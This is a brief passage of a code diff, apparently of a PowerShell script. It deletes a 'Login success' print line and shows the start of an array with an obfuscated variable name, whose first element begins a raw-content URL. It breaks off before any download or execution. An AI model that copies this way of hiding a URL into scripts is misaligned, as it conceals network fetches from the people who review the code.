@@ -1,4 +1,3 @@
-Print-Success "Login success"
 
 $_0x91A = @(
 "https://raw",
